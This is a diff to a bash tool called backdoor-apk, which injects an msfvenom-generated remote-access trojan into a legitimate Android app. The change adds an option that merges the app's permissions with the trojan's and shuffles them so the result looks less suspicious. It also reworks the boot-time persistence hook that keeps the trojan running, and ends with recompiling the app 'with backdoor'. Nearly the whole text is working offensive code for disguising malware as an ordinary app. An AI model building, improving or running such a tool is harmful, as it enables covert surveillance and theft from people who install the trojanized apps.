@@ -13,11 +13,12 @@
 #   required by other Linux distros as well.
 # apt-get install lib32z1 lib32ncurses5 lib32stdc++6
 
-VERSION="0.2.2"
+VERSION="0.2.3"
 
 PAYLOAD=""
 LHOST=""
 LPORT=""
+PERM_OPT=""
 
 MSFVENOM=msfvenom
 DEX2JAR=d2j-dex2jar
@@ -212,6 +213,28 @@ function get_lport {
   done
 }
 
+function get_perm_opt {
+  echo "[+] Android manifest permission options:"
+  PS3='[?] Please select an Android manifest permission option: '
+  options=("Keep original" "Merge with payload and shuffle")
+  select opt in "${options[@]}"
+  do
+    case $opt in
+      "Keep original")
+        PERM_OPT="KEEPO"
+        break
+        ;;
+      "Merge with payload and shuffle")
+        PERM_OPT="RANDO"
+        break
+        ;;
+      *)
+        echo "[!] Invalid option selected"
+        ;;
+    esac
+  done
+}
+
 function init {
   echo "Running backdoor-apk at $TIME_OF_RUN" >$LOG_FILE 2>&1
   print_ascii_art
@@ -230,6 +253,7 @@ function init {
   get_payload
   get_lhost
   get_lport
+  get_perm_opt
 }
 
 # kick things off
@@ -256,16 +280,6 @@ if [ $rc != 0 ] || [ ! -f $RAT_APK_FILE ]; then
   exit 1
 fi
 
-echo -n "[*] Decompiling RAT APK file..."
-$APKTOOL d -f -o $MY_PATH/payload $MY_PATH/$RAT_APK_FILE >>$LOG_FILE 2>&1
-rc=$?
-echo "done."
-if [ $rc != 0 ]; then
-  echo "[!] Failed to decompile RAT APK file"
-  cleanup
-  exit $rc
-fi
-
 echo -n "[*] Decompiling original APK file..."
 $APKTOOL d -f -o $MY_PATH/original $MY_PATH/$ORIG_APK_FILE >>$LOG_FILE 2>&1
 rc=$?
@@ -276,8 +290,8 @@ if [ $rc != 0 ]; then
   exit $rc
 fi
 
-echo -n "[*] Merging permissions of original and payload projects..."
 # build random hex placeholder value without openssl
+# used in various code that follows
 placeholder=''
 for i in `seq 1 4`; do
   rand_num=`shuf -i 1-2147483647 -n 1`
@@ -285,24 +299,42 @@ for i in `seq 1 4`; do
   placeholder="$placeholder$hex"
 done
 echo "placeholder value: $placeholder" >>$LOG_FILE 2>&1
-tmp_perms_file=$MY_PATH/perms.tmp
-original_manifest_file=$MY_PATH/original/AndroidManifest.xml
-payload_manifest_file=$MY_PATH/payload/AndroidManifest.xml
-merged_manifest_file=$MY_PATH/original/AndroidManifest.xml.merged
-grep "<uses-permission" $original_manifest_file >$tmp_perms_file
-grep "<uses-permission" $payload_manifest_file >>$tmp_perms_file
-grep "<uses-permission" $tmp_perms_file|sort|uniq >$tmp_perms_file.uniq
-mv $tmp_perms_file.uniq $tmp_perms_file
-sed "s/<uses-permission.*\/>/$placeholder/g" $original_manifest_file >$merged_manifest_file
-cat $merged_manifest_file|uniq > $merged_manifest_file.uniq
-mv $merged_manifest_file.uniq $merged_manifest_file
-sed -i "s/$placeholder/$(sed -e 's/[\&/]/\\&/g' -e 's/$/\\n/' $tmp_perms_file | tr -d '\n')/" $merged_manifest_file
-diff $original_manifest_file $merged_manifest_file >>$LOG_FILE 2>&1
-mv $merged_manifest_file $original_manifest_file
-echo "done."
 
-# cleanup payload directory after merging app permissions
-rm -rf $MY_PATH/payload >>$LOG_FILE 2>&1
+original_manifest_file=$MY_PATH/original/AndroidManifest.xml
+if [ "$PERM_OPT" == "RANDO" ]; then
+  echo -n "[*] Decompiling RAT APK file..."
+  $APKTOOL d -f -o $MY_PATH/payload $MY_PATH/$RAT_APK_FILE >>$LOG_FILE 2>&1
+  rc=$?
+  echo "done."
+  if [ $rc != 0 ]; then
+    echo "[!] Failed to decompile RAT APK file"
+    cleanup
+    exit $rc
+  fi
+  echo -n "[*] Merging permissions of original and payload projects..."
+  tmp_perms_file=$MY_PATH/perms.tmp
+  payload_manifest_file=$MY_PATH/payload/AndroidManifest.xml
+  merged_manifest_file=$MY_PATH/original/AndroidManifest.xml.merged
+  grep "<uses-permission" $original_manifest_file >$tmp_perms_file
+  grep "<uses-permission" $payload_manifest_file >>$tmp_perms_file
+  grep "<uses-permission" $tmp_perms_file|sort|uniq|shuf >$tmp_perms_file.uniq
+  mv $tmp_perms_file.uniq $tmp_perms_file
+  sed "s/<uses-permission.*\/>/$placeholder/g" $original_manifest_file >$merged_manifest_file
+  awk '/^[ \t]*'"$placeholder"'/&&c++ {next} 1' $merged_manifest_file >$merged_manifest_file.uniq
+  mv $merged_manifest_file.uniq $merged_manifest_file
+  sed -i "s/$placeholder/$(sed -e 's/[\&/]/\\&/g' -e 's/$/\\n/' $tmp_perms_file | tr -d '\n')/" $merged_manifest_file
+  diff $original_manifest_file $merged_manifest_file >>$LOG_FILE 2>&1
+  mv $merged_manifest_file $original_manifest_file
+  echo "done."
+  # cleanup payload directory after merging app permissions
+  rm -rf $MY_PATH/payload >>$LOG_FILE 2>&1
+elif [ "$PERM_OPT" == "KEEPO" ]; then
+  echo "[+] Keeping permissions of original project"
+else
+  echo "[!] Something went terribly wrong..."
+  cleanup
+  exit 1
+fi
 
 # use dex2jar, proguard, and dx
 # to shrink, optimize, and obfuscate original Rat.apk code
@@ -559,7 +591,6 @@ if [ $rc != 0 ]; then
   exit $rc
 fi
 
-echo -n "[*] Adding persistence hook in original project..."
 cat >$MY_PATH/persistence.hook <<EOL
         <receiver android:name="${payload_tld}.${payload_primary_dir}.${payload_sub_dir}.AppBoot">
             <intent-filter>
@@ -568,21 +599,31 @@ cat >$MY_PATH/persistence.hook <<EOL
         </receiver>
         <service android:exported="true" android:name="${payload_tld}.${payload_primary_dir}.${payload_sub_dir}.MainService"/>
 EOL
-sed -i '0,/<\/activity>/s//<\/activity>\n'"$placeholder"'/' $original_manifest_file >>$LOG_FILE 2>&1
+
+grep "android.permission.RECEIVE_BOOT_COMPLETED" $original_manifest_file >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc == 0 ]; then
-  sed -i '/'"$placeholder"'/r '"$MY_PATH"'/persistence.hook' $original_manifest_file >>$LOG_FILE 2>&1
+  echo -n "[*] Adding persistence hook in original project..."
+  sed -i '0,/<\/activity>/s//<\/activity>\n'"$placeholder"'/' $original_manifest_file >>$LOG_FILE 2>&1
   rc=$?
   if [ $rc == 0 ]; then
-    sed -i '/'"$placeholder"'/d' $original_manifest_file >>$LOG_FILE 2>&1
+    sed -i '/'"$placeholder"'/r '"$MY_PATH"'/persistence.hook' $original_manifest_file >>$LOG_FILE 2>&1
     rc=$?
+    if [ $rc == 0 ]; then
+      sed -i '/'"$placeholder"'/d' $original_manifest_file >>$LOG_FILE 2>&1
+      rc=$?
+    fi
   fi
-fi
-echo "done."
-if [ $rc != 0 ]; then
-  echo "[!] Failed to add persistence hook"
-  cleanup
-  exit $rc
+  echo "done."
+  if [ $rc != 0 ]; then
+    echo "[!] Failed to add persistence hook"
+    cleanup
+    exit $rc
+  fi
+else
+  echo "[+] Unable to add persistence hook due to missing permission"
+  ##### TODO #####
+  # Delete AppBoot.smali and MainService.smali before recompilation?
 fi
 
 echo -n "[*] Recompiling original project with backdoor..."
